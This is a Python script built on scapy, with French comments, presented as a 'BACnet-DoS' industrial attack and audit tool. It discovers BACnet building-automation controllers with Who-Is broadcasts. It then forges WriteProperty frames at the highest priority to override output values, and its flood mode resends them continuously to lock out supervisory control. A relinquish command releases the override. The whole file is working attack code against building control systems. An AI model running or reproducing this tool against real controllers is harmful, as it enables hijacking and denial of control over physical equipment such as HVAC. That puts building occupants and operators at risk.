import argparse
import struct
import time
import sys
from scapy.all import IP, UDP, Raw, send, sniff

class BACnetDoS:
    def __init__(self, interface, port=47808):
        self.interface = interface
        self.port = port

    def scan(self, target_range):
        """Broadcast Who-Is pour mapper les automates du réseau"""
        print(f"[*] Discovery lancé sur {target_range}...")
        # BVLC (0x81 0x0b) + NPDU (Broadcast) + APDU (Who-Is)
        who_is = b'\x81\x0b\x00\x0c\x01\x20\xff\xff\x00\xff\x10\x08'
        pkt = IP(dst=target_range)/UDP(sport=self.port, dport=self.port)/Raw(load=who_is)
        send(pkt, iface=self.interface, verbose=False)

        def display_iam(pkt):
            if pkt.haslayer(Raw) and b'\x10\x00' in pkt[Raw].load:
                print(f"[!] AUTOMATE RÉPONDU : {pkt[IP].src} (ID détecté via I-Am)")

        sniff(iface=self.interface, prn=display_iam, filter=f"udp port {self.port}", timeout=5)

    def forge_packet(self, target_ip, obj_type, obj_inst, value=None, is_relinquish=False):
        """Forge une trame WriteProperty conforme à la norme ASHRAE 135"""
        # Construction de l'Object Identifier (Type << 22 | Instance)
        obj_id = (int(obj_type) << 22) | int(obj_inst)
        obj_id_bytes = b'\x0c' + obj_id.to_bytes(4, 'big')
        
        # APDU Header: Confirmed Request (0x00), Service WriteProperty (0x0f)
        apdu_header = b'\x00\x05\x01\x0f'
        prop_id = b'\x19\x55' # Present_Value
        
        if is_relinquish:
            # Tag NULL (0x00) pour libérer la priorité
            val_tag = b'\x3e\x00\x3f'
        else:
            # Encodage IEEE 754 Float + Tag Real (0x44)
            value_hex = struct.pack('>f', float(value))
            val_tag = b'\x3e\x44' + value_hex + b'\x3f'

        # Priorité 1 (0x49 0x01) pour forcer le verrouillage matériel
        priority = b'\x49\x01'
        
        apdu = apdu_header + obj_id_bytes + prop_id + val_tag + priority
        npdu = b'\x01\x04' # Version 1, Expecting Reply
        
        # BVLC Unicast (0x81 0x0a) + Calcul de longueur
        total_len = 4 + len(npdu) + len(apdu)
        bvlc = b'\x81\x0a' + total_len.to_bytes(2, 'big')
        
        return IP(dst=target_ip)/UDP(sport=self.port, dport=self.port)/Raw(load=bvlc + npdu + apdu)

    def write(self, target_ip, obj_type, obj_inst, value):
        """Envoi unique d'une commande"""
        pkt = self.forge_packet(target_ip, obj_type, obj_inst, value)
        send(pkt, iface=self.interface, verbose=False)
        print(f"[+] Commande WriteProperty envoyée à {target_ip}")

    def flood(self, target_ip, obj_type, obj_inst, value):
        """Mode Blocage : Injection cyclique pour saturer l'automate"""
        print(f"[!!!] DOS PRIORITAIRE ACTIF sur {target_ip} (Instance {obj_inst})")
        print("[*] La supervision est maintenant bloquée. CTRL+C pour stopper.")
        pkt = self.forge_packet(target_ip, obj_type, obj_inst, value)
        try:
            while True:
                send(pkt, iface=self.interface, verbose=False)
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[-] Arrêt du flood.")

    def relinquish(self, target_ip, obj_type, obj_inst):
        """Libère le slot de priorité 1 pour rendre le contrôle à la GTB"""
        pkt = self.forge_packet(target_ip, obj_type, obj_inst, is_relinquish=True)
        send(pkt, iface=self.interface, verbose=False)
        print(f"[+] Relinquish envoyé. Contrôle rendu à l'automate sur {target_ip}")

def main():
    parser = argparse.ArgumentParser(description="BACnet-DoS: Industrial Attack & Audit Tool")
    parser.add_argument("--iface", required=True, help="Interface réseau")
    subparsers = parser.add_subparsers(dest="command")

    # Command: SCAN
    scan_p = subparsers.add_parser("scan")
    scan_p.add_argument("--range", default="255.255.255.255")

    # Commands: WRITE, FLOOD, RELINQUISH
    for cmd in ["write", "flood", "relinquish"]:
        p = subparsers.add_parser(cmd)
        p.add_argument("--target", required=True, help="IP de l'automate")
        p.add_argument("--type", type=int, default=1, help="1:Analog Output, 2:Analog Value")
        p.add_argument("--inst", type=int, required=True, help="ID de l'objet (Instance)")
        if cmd != "relinquish":
            p.add_argument("--val", type=float, required=True, help="Valeur Float à injecter")

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(1)

    tool = BACnetDoS(interface=args.iface)

    if args.command == "scan":
        tool.scan(args.range)
    elif args.command == "write":
        tool.write(args.target, args.type, args.inst, args.val)
    elif args.command == "flood":
        tool.flood(args.target, args.type, args.inst, args.val)
    elif args.command == "relinquish":
        tool.relinquish(args.target, args.type, args.inst)

if __name__ == "__main__":
    main()